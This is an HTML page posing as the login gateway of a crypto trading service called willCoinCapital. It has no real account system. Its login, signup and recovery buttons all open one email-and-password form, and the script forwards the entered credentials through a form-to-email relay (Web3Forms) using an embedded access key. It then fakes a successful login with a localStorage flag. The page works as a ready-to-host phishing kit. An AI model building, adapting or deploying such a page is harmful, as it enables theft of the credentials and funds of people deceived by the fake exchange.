<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Gateway v5.0</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000000; color: white; margin: 0; overflow: hidden; height: 100vh; }
        
        /* THE EXACT GLOW PATTERN */
        .main-aura {
            position: absolute; top: 40%; left: 50%; transform: translate(-50%, -50%);
            width: 400px; height: 400px;
            background: radial-gradient(circle, rgba(20, 184, 166, 0.25) 0%, rgba(34, 211, 238, 0) 70%);
            filter: blur(50px); z-index: 1; pointer-events: none;
        }

        /* EXACT FLOATING ASSET CARDS */
        .asset-card {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            width: 90px; height: 90px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            position: absolute; animation: floatIcon 6s ease-in-out infinite; z-index: 10;
        }

        @keyframes floatIcon {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .label-text { font-size: 11px; font-weight: 700; color: rgba(255,255,255,0.4); margin-bottom: 6px; text-transform: lowercase; }
        
        /* EXACT BUTTON STYLING */
        .btn-recover { border: 1.5px solid #14b8a6; color: #22d3ee; font-weight: 600; }
        .btn-create { background: linear-gradient(90deg, #14b8a6, #22d3ee); color: black; font-weight: 800; }
        .btn-create:hover { box-shadow: 0 10px 30px -5px rgba(34, 211, 238, 0.4); }
        
        .view-hidden { display: none !important; }
    </style>
</head>
<body class="flex flex-col items-center justify-between py-16 px-10 relative">

    <div class="main-aura"></div>

    <header class="text-center z-20 space-y-4">
        <div class="text-[10px] font-bold text-gray-500 uppercase tracking-[0.4em]">willCoinCapital</div>
        <div class="bg-white/10 px-4 py-1 rounded-full text-[9px] font-bold uppercase tracking-widest inline-block border border-white/5">
            Trade crypto anytime
        </div>
        <h1 class="text-4xl font-extrabold tracking-tight leading-tight pt-4">
            Power Up Your <br> Crypto Journey
        </h1>
    </header>

    <div class="relative w-full h-72 z-10">
        
        <div class="asset-card" style="top: 40%; left: 35%; transform: translate(-50%, -50%); animation-delay: 0.5s;">
            <span class="label-text">btc</span>
            <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" class="w-8" alt="btc">
        </div>

        <div class="asset-card" style="top: 40%; right: 35%; transform: translate(50%, -50%);">
            <span class="label-text">eth</span>
            <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png" class="w-8" alt="eth">
        </div>
    </div>

    <div class="w-full max-w-sm space-y-4 z-20">
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-xl btn-recover text-[10px] uppercase font-bold tracking-widest transition-all">
            Recover Account
        </button>
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-xl btn-create text-[10px] uppercase font-bold tracking-widest transition-all active:scale-95">
            Create Account
        </button>
        
        <div class="text-center pt-4">
            <button onclick="toggleAuth('login')" class="text-[10px] text-gray-500 font-bold uppercase tracking-widest">
                Already Have An Account? <span class="text-white ml-1">Log In</span>
            </button>
        </div>
    </div>

    <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 bg-black/95 backdrop-blur-xl" onclick="toggleAuth()"></div>
        <div class="bg-white/5 border border-white/10 max-w-sm w-full p-8 rounded-[32px] relative z-10 text-center">
            <h2 id="authTitle" class="text-lg font-black uppercase text-cyan-400 mb-6">Authorize</h2>
            <form id="authForm" class="space-y-4">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" placeholder="Email" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-xs outline-none focus:border-cyan-400">
                <input type="password" name="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-xs outline-none focus:border-cyan-400">
                <button type="submit" id="authSubmit" class="w-full py-4 btn-create rounded-xl uppercase text-[10px] tracking-widest">Continue</button>
            </form>
        </div>
    </div>

    <script>
        // AUTH PERSISTENCE ENGINE
        if (localStorage.getItem('isLoggedIn') === 'true') { 
            // In a production setup, you would have the main terminal code in a separate file and redirect.
            // For this single-file setup, we just keep the user logged in but stay on this page.
            localStorage.setItem('isLoggedIn', 'true'); 
        }

        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            document.getElementById('authTitle').innerText = mode === 'login' ? 'Welcome Back' : 'System Entry';
            modal.classList.remove('view-hidden');
        }

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const btn = document.getElementById('authSubmit');
            btn.innerText = "Processing...";
            try {
                // Submit data to Web3Forms
                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                
                // On success, set login flag and refresh
                localStorage.setItem('isLoggedIn', 'true');
                btn.innerText = "Verifying...";
                setTimeout(() => { window.location.reload(); }, 1500);
            } catch(e) { 
                btn.innerText = "Try Again"; 
            }
        };
    </script>
</body>
</html>
